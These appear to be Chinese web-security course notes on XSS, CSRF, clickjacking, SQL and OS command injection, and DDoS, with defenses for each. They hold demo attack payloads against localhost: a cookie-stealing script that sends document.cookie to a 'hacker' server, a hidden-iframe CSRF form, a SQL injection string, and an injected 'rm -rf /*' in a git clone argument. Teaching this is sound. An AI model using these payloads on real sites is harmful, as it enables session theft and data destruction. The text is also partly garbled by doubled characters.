## XSS

> Cross Siet Scripting

> 跨站脚本攻击
> XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS重叠，所以只能叫 XSS。跨站脚本攻击是指通过存在安全漏漏洞洞的Web⽹网站注册⽤用户的浏览器器内运⾏行行⾮非法的HTML标签或JavaScript 进⾏行行的⼀一种攻击。

跨站脚本攻击有可能造成以下影响:

- 利利⽤用虚假输⼊入表单骗取⽤用户个⼈人信息。

- 利利⽤用脚本窃取⽤用户的Cookie值，被害者在不不知情的情况下，帮助攻击者发送恶意请求。 

- 显示伪造的⽂文章或图⽚片。

### XSS 攻击分类

- 反射型 - url参数直接注⼊

```
// 普通 
http://localhost:3000/?from=china
// alert尝试 
http://localhost:3000/?from=<script>alert(3)</script>

// 页面上会打印alert(3)
<h2>欢迎来自 <%-from%>！！！</h2>
```

```
// 获取Cookie
http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"> </script>

// 短域名伪造 https://dwz.cn/

// 伪造cookie⼊入侵 chrome document.cookie="kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjox NTUzNTY1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="
```

```javascript
// 黑客网站 hack.js
var img = new Image()
img.src='http://localhost:4000/img?c='+document.cookie

// appi.js
app.use(async (ctx, next) => {
    log('Hack...:' + ctx.url)
    await next()
})
```

- 存储型 - 存储到DB后读取时注⼊

```javascript
// 评论 
<script>alert(1)</script>
// 跨站脚本注⼊入
我来了了<script src="http://localhost:4000/hack.js"></script>
```

### XSS攻击的危害 - Scripting能⼲干啥就能⼲干啥

- 获取⻚页⾯面数据 
- 获取Cookies 
- 劫持前端逻辑
- 发送请求 
- 偷取⽹网站的任意数据 
- 偷取⽤用户的资料料 
- 偷取⽤用户的秘密和登录态 
- 欺骗⽤用户

### 防范措施

> ejs转义⼩小知识
> <% code %>⽤用于执⾏行行其中javascript代码; 
> <%= code %>会对code进⾏行行html转义;


- HEAD

```javascript
ctx.set('X-XSS-Protection', 1) // XSS过滤
// http://localhost:3000/?from=<script>alert(3)</script> 可以拦截 但伪装⼀一下就 不不⾏行行了了
```

X-XSS-Protection的值：

- 0 禁⽌止XSS过滤。
- 1 启⽤用XSS过滤(通常浏览器器是默认的)。 如果检测到跨站脚本攻击，浏览器器将清除⻚页⾯面(删除 不不安全的部分)。

- CSP

内容安全策略略 (CSP, Content Security Policy) 是⼀一个附加的安全层，⽤用于帮助检测和缓解 某些类型的攻击，包括跨站脚本 (XSS) 和数据注⼊入等攻击。 这些攻击可⽤用于实现从数据窃 取到⽹网站破坏或作为恶意软件分发版本等⽤用途。
CSP 本质上就是建⽴立⽩白名单，开发者明确告诉浏览器器哪些外部资源可以加载和执⾏行行。我们 只需要配置规则，如何拦截是由浏览器器⾃自⼰己实现的。我们可以通过这种⽅方式来尽量量减少 XSS 攻击。

```javascript
// 只允许加载本站资源
// ctx.set('Content-Security-Policy', "default-src 'self'")
Content-Security-Policy: default-src 'self'
// 只允许加载HTTPS协议图片
Content-Security-Policy: img-src https://*
// 不允许加载任何来源框架
Content-Security-Policy: child-src 'none'
```

- 转义字符

黑名单转义
```javascript
function escape(str){
  str = str.replace(/&/g,'&amp;');
  str = str.replace(/</g,'&lt;');
  str = str.replace(/>/g,'&gt;');
  str = str.replace(/"/g,'&quto;');
  str = str.replace(/'/g,'&#39;');
  str = str.replace(/`/g,'&#96;');
  str = str.replace(/\//g,'&#x2F;');
  return str;
}
```

⽤用户的输⼊入永远不不可信任的，最普遍的做法就是转义输⼊入输出的内容，对于引号、尖括号、斜杠进⾏行行转义

富⽂文本来说，显然不不能通过上⾯面的办法来转义所有字符，因为这样会把需要的格式也过掉。
对于这种情况，通常采⽤用⽩白名单过滤的办法，当然也可以通过⿊黑名单过滤，但是考虑到需要过
滤的标签和标签属性实在太多，更更加推荐使⽤用⽩白名单的⽅方式。

白名单转义

```javascript
const xss = require('xss');
let html = xss('<h1>XSS Demo</h1><script>alert('xss')</script>')
console.log('xss', html);
// <h1>XSS Demo</h1>&lt;script&gt;alert('xss')&lt;/script&gt;
```

- HttpOnly Cookie

这是预防XSS攻击窃取⽤用户cookie最有效的防御⼿手段。Web应 ⽤用程序在设置cookie时，将 其属性设为HttpOnly，就可以避免该⽹网⻚页的cookie被客户端恶意JavaScript窃取，保护⽤用 户cookie信息。

```javascript
response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly")
```

## CSRF

> CSRF(Cross Site Request Forgery)，即跨站请求伪造，是⼀一种常⻅见的Web攻击，它利利⽤用⽤用户已登录的身份，在⽤用户毫不不知情的情况下，以⽤用户的名义完成⾮非法操作。

- ⽤用户已经登录了了站点 A，并在本地记录了了 cookie
- 在⽤用户没有登出站点 A 的情况下(也就是 cookie ⽣生效的情况下)，访问了了恶意攻击者提供的引 诱危险站点 B (B 站点要求访问站点A)。
- 站点 A 没有做任何 CSRF 防御

```javascript
// 用户登录一个站点，然后访问了一个黑客网站
// http://localhost:4000/csrf.html
  document.write(`
  <form name="form" action="http://localhost:3000/updateText" method="post" target=“csrf”>
    添加评论: <input type="text" name="text" value="CSRF评论。。" />
  </form>
  `)
  var iframe = document.createElement('iframe')
  iframe.name = 'csrf'
  iframe.style.display = 'none'
  document.body.appendChild(iframe)
  setTimeout(function() {
    document.querySelector('form').submit();
  },1000)
```

### CRF攻击危害

- 利利⽤用⽤用户登录态
- ⽤用户不不知情
- 完成业务请求
- 盗取⽤用户资⾦金金(转账，消费)
- 冒充⽤用户发帖背锅
- 损害⽹网站声誉


### 防范措施

- 禁⽌止第三⽅方⽹网站带Cookie - 有兼容性问题

- Referer Check - Https不不发送referer

```javascript
app.use(async (ctx, next) => {
  await next()
  const referer = ctx.request.header.referer
  console.log('Referer:', referer)
})
```

- 验证码 token

## 点击劫持 - clickjacking

> 点击劫持是⼀一种视觉欺骗的攻击⼿手段。攻击者将需要攻击的⽹网站通过 iframe 嵌套的⽅方式嵌⼊入⾃自⼰己的⽹网⻚页中，并将 iframe 设置为透明，在⻚页⾯面中透出⼀一个按钮诱导⽤用户点击。


### 防范措施

- X-FRAME-OPTIONS

X-FRAME-OPTIONS 是⼀一个 HTTP 响应头，在现代浏览器器有⼀一个很好的⽀支持。这个 HTTP 响应头就是为了了防御⽤用 iframe 嵌套的点击劫持攻击。

该响应头有三个值可选，分别是
  - DENY，表示⻚页⾯面不不允许通过 iframe 的⽅方式展示
  - SAMEORIGIN，表示⻚页⾯面可以在相同域名下通过 iframe 的⽅方式展示 
  - ALLOW-FROM，表示⻚页⾯面可以在指定来源的 iframe 中展示

```javascript
ctx.set('X-FRAME-OPTIONS', 'DENY')
```

- JS方式

```javascript
 
<head>
  <style id="click-jack">
    html {
      display: none !important;
    }
  </style>
</head>
<body>
  <script>
    if (self == top) {
      var style = document.getElementById('click-jack')
      document.body.removeChild(style)
    } else {
      top.location = self.location
    }
  </script>
</body>
```
以上代码的作⽤用就是当通过 iframe 的⽅方式加载⻚页⾯面时，攻击者的⽹网⻚页直接不不显示所有内容了了。

## SQL 注入

```javascript
// 填⼊入特殊密码 
1'or'1'='1
// 拼接后的SQL
SELECT *
FROM test.user
WHERE username = 'laowang' AND password = '1'or'1'='1'
```

### 防范措施

- 所有的查询语句句建议使⽤用数据库提供的参数化查询接⼝口**，参数化的语句句使⽤用参数⽽而不不是将⽤用户 输⼊入变量量嵌⼊入到 SQL 语句句中，即不不要直接拼接 SQL 语句句。例例如 Node.js 中的 mysqljs 库的 query ⽅方法中的 ? 占位参数。

- 严格限制Web应⽤用的数据库的操作权限**，给此⽤用户提供仅仅能够满⾜足其⼯工作的最低权限，从⽽而 最⼤大限度的减少注⼊入攻击对数据库的危害 

- 后端代码检查输⼊入的数据是否符合预期**，严格限制变量量的类型，例例如使⽤用正则表达式进⾏行行⼀一些 匹配处理理。

- 对进⼊入数据库的特殊字符('，"，\，<，>，&，*，; 等)进⾏行行转义处理理，或编码转换**。基本上 所有的后端语⾔言都有对字符串串进⾏行行转义处理理的⽅方法，⽐比如 lodash 的 lodash._escapehtmlchar 库。

## OS命令注入

OS命令注⼊入和SQL注⼊入差不不多，只不不过SQL注⼊入是针对数据库的，⽽而OS命令注⼊入是针对操作系统的。 OS命令注⼊入攻击指通过Web应⽤用，执⾏行行⾮非法的操作系统命令达到攻击的⽬目的。只要在能调⽤用Shell函数 的地⽅方就有存在被攻击的⻛风险。倘若调⽤用Shell时存在疏漏漏，就可以执⾏行行插⼊入的⾮非法命令。

```javascript
// 以 Node.js 为例例，假如在接⼝口中需要从 github 下载⽤用户指定的 repo 
const exec = require('mz/child_process').exec;
let params = {/* ⽤用户输⼊入的参数 */};
exec(`git clone ${params.repo} /some/path`);
```

如果传⼊入的参数是会怎样

```
https://github.com/xx/xx.git && rm -rf /* &&
```

## 请求劫持

- DNS劫持 

顾名思义，DNS服务器器(DNS解析各个步骤)被篡改，修改了了域名解析的结果，使得访问到的不不是预期的ip

- HTTP劫持 

运营商劫持，此时⼤大概只能升级HTTPS了了


## DDOS

> http://www.ruanyifeng.com/blog/2018/06/ddos.html 阮阮⼀一峰

distributed denial of service
DDOS 不不是⼀一种攻击，⽽而是⼀一⼤大类攻击的总称。它有⼏几⼗十种类型，新的攻击⽅方法还在不不断发明出来。 ⽹网站运⾏行行的各个环节，都可以是攻击⽬目标。只要把⼀一个环节攻破，使得整个流程跑不不起来，就达到了了 瘫痪服务的⽬目的。
其中，⽐比较常⻅见的⼀一种攻击是 cc 攻击。它就是简单粗暴暴地送来⼤大量量正常的请求，超出服务器器的最⼤大承 受量量，导致宕机。我遭遇的就是 cc 攻击，最多的时候全世界⼤大概20多个 IP 地址轮流发出请求，每个 地址的请求量量在每秒200次~300次。我看访问⽇日志的时候，就觉得那些请求像洪⽔水⼀一样涌来，⼀一眨眼 就是⼀一⼤大堆，⼏几分钟的时间，⽇日志⽂文件的体积就⼤大了了100MB。说实话，这只能算⼩小攻击，但是我的个 ⼈人⽹网站没有任何防护，服务器器还是跟其他⼈人共享的，这种流量量⼀一来⽴立刻就下线了了。

### 防御⼿手段

 
- 备份⽹网站 
备份⽹网站不不⼀一定是全功能的，如果能做到全静态浏览，就能满⾜足需求。最低限度应该可以显示公告，告诉⽤用户，⽹网站出了了问题，正在全⼒力力抢修。 
- HTTP 请求的拦截
硬件 服务器器 防⽕火墙 
- 带宽扩容 + CDN
提⾼高犯罪成本